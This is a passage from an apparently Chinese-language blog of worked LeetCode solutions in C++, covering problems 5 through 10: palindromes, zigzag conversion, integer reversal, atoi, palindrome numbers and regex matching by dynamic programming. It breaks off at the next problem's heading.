style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;">]</span></span></span></span></span> 向左右寻找即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string res; <span class="comment">//储存回文子串</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++) <span class="comment">//遍历中间点</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//奇数回文串</span></span><br><span class="line">            <span class="type">int</span> l=i<span class="number">-1</span>;</span><br><span class="line">            <span class="type">int</span> r=i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(l&gt;=<span class="number">0</span> &amp;&amp; r&lt;=s.<span class="built_in">size</span>() &amp;&amp; s[l]==s[r])<span class="comment">//出界或字符不匹配退出循环</span></span><br><span class="line">            &#123;</span><br><span class="line">                l--;</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(res.<span class="built_in">size</span>()&lt;r-l<span class="number">-1</span>) res=s.<span class="built_in">substr</span>(l+<span class="number">1</span>,r-l<span class="number">-1</span>);<span class="comment">//储存最长回文串</span></span><br><span class="line">            <span class="comment">//偶数回文串</span></span><br><span class="line">            l=i;</span><br><span class="line">            r=i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(l&gt;=<span class="number">0</span> &amp;&amp; r&lt;=s.<span class="built_in">size</span>() &amp;&amp; s[l]==s[r])</span><br><span class="line">            &#123;</span><br><span class="line">                l--;</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(res.<span class="built_in">size</span>()&lt;r-l<span class="number">-1</span>) res=s.<span class="built_in">substr</span>(l+<span class="number">1</span>,r-l<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="6-n-字形变换"><a href="https://leetcode.cn/problems/zigzag-conversion/">6. N 字形变换</a></h2><p>样例：<code>s=PAYPALISHIRING numRows=3</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">P   A   H   N</span><br><span class="line">A P L S I I G</span><br><span class="line">Y   I   R</span><br><span class="line"></span><br><span class="line"># PAHNAPLSIIGYIR</span><br></pre></td></tr></table></figure><p>本质即为找规律，第一行和最后一行可看成一个等差数列，中间行可看为两个等差数列，注意首项和公差之间的规律即可（注意当n==1，公差为0会进入死循环，需要特殊判断）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1          11          21          31</span><br><span class="line">2       10 12       20 22       30 32</span><br><span class="line">3     9    13     19   23     29   33</span><br><span class="line">4   8      14   18     24   28     34</span><br><span class="line">5 7        15 17       25 27       35</span><br><span class="line">6          16          26          36</span><br></pre></td></tr></table></figure><p>以数字字符串为例，便于找到规律。所有等差数列公差为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>n</mi><mo>−</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">2n-2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>，除第一行与最后一行，两等差数列首项之差为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>n</mi><mo>−</mo><mn>2</mn><mo>−</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">2n-2-i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>（i为行头元素）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">convert</span><span class="params">(string s, <span class="type">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        string res;<span class="comment">//保存结果</span></span><br><span class="line">        <span class="keyword">if</span>(numRows==<span class="number">1</span>) <span class="keyword">return</span> s;<span class="comment">//特殊判断</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numRows;i++)<span class="comment">//遍历每行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>||i==numRows<span class="number">-1</span>)<span class="comment">//首行或末行</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;s.<span class="built_in">size</span>();j+=<span class="number">2</span>*numRows<span class="number">-2</span>)<span class="comment">//等差数列</span></span><br><span class="line">                &#123;</span><br><span class="line">                    res+=s[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//两个等差数列首项j、k</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=i,k=<span class="number">2</span>*numRows<span class="number">-2</span>-i;j&lt;s.<span class="built_in">size</span>()||k&lt;s.<span class="built_in">size</span>();j+=<span class="number">2</span>*numRows<span class="number">-2</span>,k+=<span class="number">2</span>*numRows<span class="number">-2</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(j&lt;s.<span class="built_in">size</span>()) res+=s[j];<span class="comment">//注意顺序</span></span><br><span class="line">                    <span class="keyword">if</span>(k&lt;s.<span class="built_in">size</span>()) res+=s[k];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="7-整数反转"><a href="https://leetcode.cn/problems/reverse-integer/">7. 整数反转</a></h2><blockquote><p>注意题目要求：如果反转后整数超过 32 位的有符号整数的范围 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">[</mo><mo>−</mo><msup><mn>2</mn><mn>3</mn></msup><mn>1</mn><mo separator="true">,</mo><msup><mn>2</mn><mn>3</mn></msup><mn>1</mn><mo>−</mo><mn>1</mn><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[-2^31,2^31-1\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span> ，就返回 0。</p><p>假设环境不允许存储 64 位整数（有符号或无符号）。即不使用longlong类型存放数据</p></blockquote><p>将数据存入字符串中，用字符串内置方法可过，这里用数学方法</p><p>基本思路：思路非常简单，每次通过模10运算取出最后一位与上次保留结果的十倍相加（秦九韶算法），此方法对负数依然成立，根本原因为C++中的取模运算与数学中不同，负数取模仍返回负数，这对我们的算法有利</p><p>不限制longlong型：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reverse</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> r=<span class="number">0</span>;<span class="comment">//保存结果，初始值为0</span></span><br><span class="line">        <span class="keyword">while</span>(x)</span><br><span class="line">        &#123;</span><br><span class="line">            r=r*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(r&gt;INT_MAX) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//INT_MAX为常量，int型最大值</span></span><br><span class="line">        <span class="keyword">if</span>(r&lt;INT_MIN) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果限制只能使用<code>int</code>类型存储的话，我们要再循环内判断是否超过范围。假设<code>r</code>为正数时，想判断<code>10*r+x%10&gt;INT_MAX</code>，直接判断会爆int，我们根据数学方法变形为<code>r&gt;((INT_MAX-x%10))/10</code>即可，负数同理</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reverse</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> r=<span class="number">0</span>;<span class="comment">//保存结果，初始值为0</span></span><br><span class="line">        <span class="keyword">while</span>(x)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(r&gt;<span class="number">0</span>&amp;&amp;r&gt;(INT_MAX-x%<span class="number">10</span>)/<span class="number">10</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(r&lt;<span class="number">0</span>&amp;&amp;r&lt;(INT_MIN-x%<span class="number">10</span>)/<span class="number">10</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            r=r*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="8-字符串转换整数-atoi"><a href="https://leetcode.cn/problems/string-to-integer-atoi/">8. 字符串转换整数 (atoi)</a></h2><p>典型的模拟题，需要自己模拟<code>atoi</code>函数，这题要求很多，按需求一步一步来</p><p>思路比较常规，和上一题一样（秦九韶算法），一位位读取即可</p><p>不限制<code>long long</code>类型的写法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">myAtoi</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> k=<span class="number">0</span>;<span class="comment">//用来记录当前遍历到字符串元素的下表</span></span><br><span class="line">        <span class="keyword">while</span>(k&lt;s.<span class="built_in">size</span>()&amp;&amp;s[k]==<span class="string">&#x27; &#x27;</span>) k++;<span class="comment">//去除字符串前面的空格</span></span><br><span class="line">        <span class="keyword">if</span>(k==s.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//特殊判断，防止字符串仅包含空格或为空，导致越界</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> minus =<span class="number">1</span>;<span class="comment">//保存符号，默认为正</span></span><br><span class="line">        <span class="keyword">if</span>(s[k]==<span class="string">&#x27;-&#x27;</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            minus=<span class="number">-1</span>;<span class="comment">//更改符号</span></span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[k]==<span class="string">&#x27;+&#x27;</span>) k++;</span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res=<span class="number">0</span>;<span class="comment">//储存结果</span></span><br><span class="line">        <span class="keyword">while</span>(k&lt;s.<span class="built_in">size</span>()&amp;&amp;s[k]&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;s[k]&lt;=<span class="string">&#x27;9&#x27;</span>)<span class="comment">//储存数据</span></span><br><span class="line">        &#123;</span><br><span class="line">            res=res*<span class="number">10</span>+(s[k]-<span class="string">&#x27;0&#x27;</span>);<span class="comment">//秦九韶算法</span></span><br><span class="line">            k++;</span><br><span class="line">            <span class="keyword">if</span>(res&gt;INT_MAX) <span class="keyword">break</span>;<span class="comment">//越界提前退出循环，防止爆long long</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res *= minus;<span class="comment">//带上符号</span></span><br><span class="line">        <span class="keyword">if</span>(res&gt;INT_MAX) <span class="keyword">return</span> INT_MAX;<span class="comment">//判断是否越界</span></span><br><span class="line">        <span class="keyword">if</span>(res&lt;INT_MIN) <span class="keyword">return</span> INT_MIN;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果限制只能使用<code>int</code>类型，我们只需要在存数时改变越界的判断即可，这里有一个<strong>坑</strong>点，在while循环中我们存放的是整数的绝对值，而int类型的最小值为<code>-2147483648</code>，最大值为<code>2147483647</code>，这就导致恰好为最小值时我们无法将其绝对值存入，需要特殊判断</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">myAtoi</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> k=<span class="number">0</span>;<span class="comment">//用来记录当前遍历到字符串元素的下表</span></span><br><span class="line">        <span class="keyword">while</span>(k&lt;s.<span class="built_in">size</span>()&amp;&amp;s[k]==<span class="string">&#x27; &#x27;</span>) k++;<span class="comment">//去除字符串前面的空格</span></span><br><span class="line">        <span class="keyword">if</span>(k==s.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//特殊判断，防止字符串仅包含空格或为空，导致越界</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> minus =<span class="number">1</span>;<span class="comment">//保存符号，默认为正</span></span><br><span class="line">        <span class="keyword">if</span>(s[k]==<span class="string">&#x27;-&#x27;</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            minus=<span class="number">-1</span>;<span class="comment">//更改符号</span></span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[k]==<span class="string">&#x27;+&#x27;</span>) k++;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;<span class="comment">//储存结果</span></span><br><span class="line">        <span class="keyword">while</span>(k&lt;s.<span class="built_in">size</span>()&amp;&amp;s[k]&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;s[k]&lt;=<span class="string">&#x27;9&#x27;</span>)<span class="comment">//储存数据</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(minus&gt;<span class="number">0</span>&amp;&amp;res&gt;(INT_MAX-(s[k]-<span class="string">&#x27;0&#x27;</span>))/<span class="number">10</span>) <span class="keyword">return</span> INT_MAX;<span class="comment">//正数越界判断</span></span><br><span class="line">            <span class="keyword">if</span>(minus&lt;<span class="number">0</span>&amp;&amp;-res&lt;(INT_MIN+(s[k]-<span class="string">&#x27;0&#x27;</span>))/<span class="number">10</span>) <span class="keyword">return</span> INT_MIN;</span><br><span class="line">            <span class="keyword">if</span>(-res*<span class="number">10</span>-(s[k]-<span class="string">&#x27;0&#x27;</span>)==INT_MIN) <span class="keyword">return</span> INT_MIN;<span class="comment">//特殊判断最小值</span></span><br><span class="line">            res=res*<span class="number">10</span>+(s[k]-<span class="string">&#x27;0&#x27;</span>);<span class="comment">//秦九韶算法</span></span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res *= minus;<span class="comment">//带上符号</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="9-回文数"><a href="https://leetcode.cn/problems/palindrome-number/">9. 回文数</a></h2><p>简单题做法很多</p><p><strong>转换成字符串</strong>：看反转后与之前是否相同（<code>rbegin()</code>、<code>rend()</code>反向迭代器）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        string s=<span class="built_in">to_string</span>(x);<span class="comment">//转化为字符串</span></span><br><span class="line">        <span class="keyword">return</span> s==<span class="built_in">string</span>(s.<span class="built_in">rbegin</span>(),s.<span class="built_in">rend</span>());<span class="comment">//反转看与原串是否相等</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>或者可以用第七题中整数反转思想反转（负数可直接特判为<code>false</code>）</p><h2 id="10-正则表达式匹配-困难"><a href="https://leetcode.cn/problems/regular-expression-matching/">10. 正则表达式匹配</a>（困难）</h2><p>很喜欢一条评论——这不仅是我刷的第十道题，也是我人生中的一道坎</p><p>这种两个字符串匹配的问题通常可以使用DP（动态规划来解决），我们来分析一下，两个字符串的DP问题我们通常用二维数组存储</p><p><img src="https://s2.loli.net/2023/09/25/71B4ekO9jqJspDT.png" alt="图嫖的其他题解"></p><blockquote><p>注意：本题中<code>*</code>代表匹配零个或多个前面的那一个元素，和正常的正则语法不同，这里看了半天😈</p></blockquote><p>时间复杂度分析：这里按照图中黑字的状态转移方程，更新状态时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，枚举<code>*</code>匹配的字符个数时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，总时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，需要进行优化</p><p>我们可以列出<code>f(i-1,j)</code>的状态转移方程，发现其中的共用部分，用其状态来更新<code>f(i,j)</code>的状态，可将枚举阶段的时间复杂度优化为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，最终状态方程如以上红字（优化方式类似于完全背包）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isMatch</span><span class="params">(string s, string p)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>(), m = p.<span class="built_in">size</span>();</span><br><span class="line">        s = <span class="string">&#x27; &#x27;</span> + s, p = <span class="string">&#x27; &#x27;</span> + p; <span class="comment">//使字符串下标从1开始</span></span><br><span class="line"></span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">f</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt; (m + <span class="number">1</span>));<span class="comment">//创建二维数组</span></span><br><span class="line">        f[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;<span class="comment">//初始化状态</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i ++) <span class="comment">//f(0,j)可能成功匹配，i从0开始</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)<span class="comment">//f(i,0)无意义</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// if (j + 1 &lt;= m &amp;&amp; p[j + 1] == &#x27;*&#x27;) continue;</span></span><br><span class="line">                <span class="keyword">if</span> (i &amp;&amp; p[j] != <span class="string">&#x27;*&#x27;</span>) <span class="comment">//状态转移需要用到i - 1, 所以需要保证i &gt; 0</span></span><br><span class="line">                &#123;</span><br><span class="line">                    f[i][j] = f[i - <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; (s[i] == p[j] || p[j] == <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (p[j] == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    f[i][j] = f[i][j - <span class="number">2</span>] ||(i &amp;&amp; f[i - <span class="number">1</span>][j] &amp;&amp; (s[i] == p[j - <span class="number">1</span>] || p[j - <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> f[n][m];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// a***abc是谁整出来的测试用例???? </span></span><br></pre></td></tr></table></figure><h1>Week2</h1><h2 id="11-盛最多水的容器"><a href="https://leetcode.cn/problems/container-with-most-water/">11. 